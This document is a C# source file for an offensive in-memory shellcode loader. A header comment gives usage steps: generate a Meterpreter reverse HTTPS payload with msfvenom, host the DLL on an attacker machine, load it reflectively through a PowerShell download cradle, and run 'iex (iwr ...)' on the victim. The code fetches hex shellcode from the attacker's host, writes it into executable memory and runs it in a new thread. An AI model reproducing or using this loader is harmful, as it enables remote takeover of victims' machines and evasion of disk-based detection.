using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;

/*
Reflectively load and run a DLL in memory. Steps to use:
1. msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.0.27 lport=443 -f hex -o helloworld.txt
2. Compile the DLL and host is on attacker machine
3. Create test.ps1 with the following code:
  $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.0.27/hex_dll_runner.dll')
  $assem = [System.Reflection.Assembly]::Load($data)
  $class = $assem.GetType("hex_dll_runner.Class1")
  $method = $class.GetMethod("hex_runner")
  $method.Invoke(0, $null)
4. On the victim machine, execute the following command: iex (iwr http://192.168.0.27/test.ps1 -usebasicparsing)
*/

namespace hex_dll_runner
{
    public class Class1
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect
            );

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId
            );

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds
            );
        public static byte[] FromHex(string hex)
        {
            hex = hex.Replace("-", "");
            byte[] raw = new byte[hex.Length / 2];
            for (int i = 0; i < raw.Length; i++)
            {
                raw[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            }
            return raw;
        }

        public static void hex_runner()
        {
            WebClient req = new WebClient();
            string asdf = req.DownloadString("http://192.168.0.27/helloworld.txt");
            byte[] buf = FromHex(asdf);

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
